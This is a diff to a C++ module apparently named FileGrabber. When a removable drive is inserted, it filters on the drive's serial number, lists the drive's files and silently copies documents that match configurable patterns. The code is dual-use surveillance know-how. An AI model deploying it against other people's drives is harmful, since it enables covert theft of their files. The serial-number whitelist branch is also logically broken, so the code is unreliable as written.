@@ -19,61 +19,55 @@
 using namespace std;
 using namespace filesystem;
 
-bool IsServiceOn = true;
-bool IsCopyOn = true;
-
 void DeviceArrivalMain(TCHAR DriveLetter) {
-	/*
-	try {
-		Device dv(DriveLetter);
-		SQLConnection conn(L"rec.db");
-		conn.open();
-		conn.insertRecord(dv);
-		conn.close();
+	LOG->i(wstring(L"File grabbing module started. Ready to grab files. Drive Letter: ") + DriveLetter);
+	SystemConfig* config = SystemConfig::getInstance();
+	Device dv(DriveLetter);
+	Device::DiskInformation info = dv.GetDiskInformation();
+	unsigned int SN = info.VolumeSerialNumber;
+	switch (config->ListenSN) {
+	case SystemConfig::SNMode::DISABLED:
+		return;
+	case SystemConfig::SNMode::EXCEPTATIONS:
+		for (unsigned int i : config->SNFilter) {
+			if (i == SN) {
+				return;
+			}
+		}
+		break;
+	case SystemConfig::SNMode::LISTENLIST:
+		for (unsigned int i : config->SNFilter) {
+			if (i == SN) {
+				break;
+			}
+		}
+		return;
 	}
-	catch (exception& e) {
-		MessageBoxA(NULL, e.what(), "FileGrabber - Error", MB_ICONERROR);
-	}
-	*/
-	try {
-		LOG->i(wstring(L"File grabbing module started. Ready to grab files. Drive Letter: ") + DriveLetter);
-		Device dv(DriveLetter);
-		Device::DiskInformation info = dv.GetDiskInformation();
-		FileLister lister(dv);
-		shared_ptr<list<FileData>> pls = lister.ListFile();
-		FileSearcher fs;
-		shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.doc" ,L".*.docx" });
+	FileLister lister(dv);
+	shared_ptr<list<FileData>> pls = lister.ListFile();
+	FileSearcher fs;
+	shared_ptr<list<FileData>> psls;
+	if (config->NormalCopy) {
+		psls = fs.FindFileRegex(pls, SystemConfig::getInstance()->NormalCopyFilters);
 		FileCopyer cp(dv, psls);
 		cp.ListFile(pls);
-		if (IsCopyOn) {
+		if (SystemConfig::getInstance()->FileCopyer) {
 			cp.Copy();
 		}
-		LOG->i(wstring(L"Grab done. Device Drive Letter: ") + DriveLetter);
 	}
-	catch (exception & e) {
-		LOG->e(wstring(L"Fatal Error: ") + Convert().toString(e.what()));
-	}
-	catch (...) {
-		LOG->e(L"Fatal Error: Unknown Error.");
-	}
-	/*
-	if (SystemConfig::getInstance()->FileCopyer) {
-		if (SystemConfig::getInstance()->NormalCopy) {
-			FileSearcher fsr;
-			shared_ptr<list<FileData>> psls = fsr.FindFile(pls, SystemConfig::getInstance()->NormalCopyFilters);
-			cp.setPaths(psls);
+	if (config->RegexCopy) {
+		psls = fs.FindFileRegex(pls, SystemConfig::getInstance()->RegexCopyFilters);
+		FileCopyer cp(dv, psls);
+		cp.ListFile(pls);
+		if (SystemConfig::getInstance()->FileCopyer) {
 			cp.Copy();
-			cp.Encrypt();
-		}
-		if (SystemConfig::getInstance()->RegexCopy) {
-			FileSearcher fsr;
-			shared_ptr<list<FileData>> psls = fsr.FindFileRegex(pls, SystemConfig::getInstance()->RegexCopyFilters);
-			cp.setPaths(psls);
-			cp.Copy();
-			cp.Encrypt();
 		}
 	}
-	*/
+	if (!config->RegexCopy && !config->NormalCopy) {
+		FileCopyer cp(dv, psls);
+		cp.ListFile(pls);
+	}
+	LOG->i(wstring(L"Grab done. Device Drive Letter: ") + DriveLetter);
 }
 
 void DeviceRemovalMain(TCHAR DriveLetter) {
@@ -83,4 +77,5 @@ void DeviceRemovalMain(TCHAR DriveLetter) {
 // Usually this function should be empty.
 void InitProgram() {
 	Log::getInstance();
+	SystemConfig::getInstance()->ReadConfig();
 }
